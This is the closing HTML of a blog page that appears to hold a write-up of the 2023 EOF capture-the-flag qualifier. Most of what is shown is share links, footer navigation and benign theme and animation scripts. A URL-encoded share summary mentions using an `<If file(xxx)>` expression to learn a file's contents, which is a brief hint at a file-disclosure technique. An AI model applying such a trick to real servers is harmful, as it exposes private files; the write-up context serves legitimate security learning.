de%3e%26lt%3bIf%20file%28xxx%29%26gt%3b%3c%2fcode%3e%20%e4%be%86%e5%be%97%e7%9f%a5%e6%aa%94%e6%a1%88%e5%85%a7%e5%ae%b9%e3%80%82%3cbr%3e%0a%3ca%20href%3d%22https%3a%2f%2fblog.csdn.net%2fsolitudi%2farticle%2fdetails%2f116666720%22%3ehttps%3a%2f%2fblog.csdn.net%2fsolitudi%2farticle%2fdetails%2f116666720%3c%2fa%3e%3c%2fp%3e" aria-label=Tumblr><i class="fab fa-tumblr fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fomeletwithoutegg.github.io%2f2023%2f01%2f13%2f2023-eof-quals%2f&t=2023%20EOF%20quals" aria-label="Hacker News"><i class="fab fa-hacker-news fa-lg" aria-hidden=true></i></a></li></ul></div><div id=actions-footer><a id=menu-toggle class=icon href=# onclick='return $("#nav-footer").toggle(),!1' aria-label=Menu><i class="fas fa-bars fa-lg" aria-hidden=true></i> Menu</a>
<a id=toc-toggle class=icon href=# onclick='return $("#toc-footer").toggle(),!1' aria-label=TOC><i class="fas fa-list fa-lg" aria-hidden=true></i> TOC</a>
<a id=share-toggle class=icon href=# onclick='return $("#share-footer").toggle(),!1' aria-label=Share><i class="fas fa-share-alt fa-lg" aria-hidden=true></i> share</a>
<a id=top style=display:none class=icon href=# onclick='$("html, body").animate({scrollTop:0},"fast")' aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg" aria-hidden=true></i> Top</a></div></div></div><footer id=footer><div class=footer-left>Copyright &copy; 2025 Omelet</div><div class=footer-right><nav><ul><li><a href=/>Home</a></li><li><a href=/about/>About</a></li><li><a href=/posts/>Posts</a></li><li><a href=/resources/>Resources</a></li><li><a href=/search/>Search</a></li><li><a href=/tags/>Tags</a></li></ul></nav></div></footer></div><link rel=stylesheet href=/lib/font-awesome/css/all.min.css><script src=/lib/jquery/jquery.min.js></script><script src=/js/main.js></script><script>MathJax={tex:{inlineMath:[["$","$"],["\\(","\\)"]]},svg:{fontCache:"global"}}</script><script type=text/javascript id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><script src=/lib/clipboard/clipboard.min.js></script><script>$(function(){let e='<span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!" style="z-index: 9999">';e+='<i class="far fa-clone"></i>',e+="</span>",$(".highlight table").before(e);const t=new ClipboardJS(".btn-copy",{text:function(e){const t='code[data-lang]:not([data-lang=""]) > span',n=Array.from(e.nextElementSibling.querySelectorAll(t)),s=n.map(e=>e.innerText).join("");return s}});t.on("success",function(e){e.trigger.setAttribute("aria-label","Copied!"),e.clearSelection()}),t.on("error",function(e){console.error("Action:",e.action),console.error("Trigger:",e.trigger)})})</script><button id=dark-mode-toggle-btn aria-label="Toggle dark mode" style=display:none>
<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path class="sun" d="M12 1v2m0 18v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2m18 0h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42M12 17.5a5.5 5.5.0 100-11 5.5 5.5.0 000 11z"/><path class="moon" d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
</button>
<script>function getSavedTheme(){return localStorage.getItem("theme")||"dark"}function saveTheme(e){localStorage.setItem("theme",e)}function applyTheme(e){document.documentElement.setAttribute("data-theme",e)}function toggleTheme(){const t=getSavedTheme(),e=t==="dark"?"white":"dark";applyTheme(e),saveTheme(e)}applyTheme(getSavedTheme()),window.addEventListener("storage",function(e){e.key==="theme"&&applyTheme(e.newValue)})</script><script type=text/javascript src=/js/canvas-nest.js></script><canvas id=bganim-canvas></canvas>
<button id=bganim-toggle-btn aria-label="Toggle background animation" style=display:none>
<svg width="30" height="25" viewBox="0 0 200 200"><polygon class="hexagon" points="100,20 170,60 170,140 100,180 30,140 30,60" fill="none" stroke="currentColor" stroke-width="15"/></svg>
</button>
<script>let movingPoints=null;function initMovingPoints(){if(movingPoints!==null)return;movingPoints=createMovingPoints({canvas:document.getElementById("bganim-canvas"),config:{count:90,color:"0,200,100",opacity:.5}})}function getSavedEnabledState(){const e=localStorage.getItem("bganim-enabled"),t=window.innerWidth>=480,n=e==="true";return e===null?t:n}function saveEnabledState(e){localStorage.setItem("bganim-enabled",e)}function applyEnabledState(e){document.documentElement.setAttribute("data-bganim-enabled",e),e?(initMovingPoints(),movingPoints.startAnimation()):movingPoints!==null&&movingPoints.stopAnimation()}function toggleEnabledState(){const t=getSavedEnabledState(),e=!t;applyEnabledState(e),saveEnabledState(e)}$(function(){applyEnabledState(getSavedEnabledState())}),window.addEventListener("storage",function(e){e.key==="bganim-enabled"&&applyEnabledState(e.newValue==="true")})</script><script>$("#nav > ul").append("<li></li>"),$("#dark-mode-toggle-btn").appendTo("#nav > ul > li:last-child"),$("#dark-mode-toggle-btn").click(toggleTheme),$("#dark-mode-toggle-btn").show(),$("#bganim-toggle-btn").appendTo("#nav > ul > li:last-child"),$("#bganim-toggle-btn").click(toggleEnabledState),$("#bganim-toggle-btn").show()</script></body></html>